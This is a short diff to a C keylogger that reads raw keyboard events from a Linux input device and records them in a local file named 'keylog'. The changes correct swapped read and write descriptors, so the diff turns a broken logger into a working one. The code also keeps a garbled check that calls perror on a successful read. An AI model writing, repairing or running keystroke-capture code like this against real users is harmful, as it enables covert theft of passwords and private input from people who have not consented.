@@ -18,7 +18,7 @@ int main(int argc, char* argv[])
 {
     int fd;
     struct input_event *buf;
-    fd = open("/dev/input/event4", O_RDWR);
+    fd = open("/dev/input/event3", O_RDWR);
     int fdlog = open("keylog", O_RDWR | O_CREAT , 0644);
     buf = calloc(1, sizeof(struct input_event));
     if(fd<3)
@@ -31,14 +31,14 @@ int main(int argc, char* argv[])
     alarm(20);
     while(1)
     {
-        count = read(fdlog, buf, sizeof(struct input_event));
+        count = read(fd, buf, sizeof(struct input_event));
         if(count == sizeof(struct input_event))
         {
             perror("read");
-            return -1;
+   //         return -1;
         }
-        //printf("get your key\n");
-        write(fd, buf, count);
+        printf("get your key\n");
+        write(fdlog, buf, count);
         usleep(10000);
     }
     close(fd);
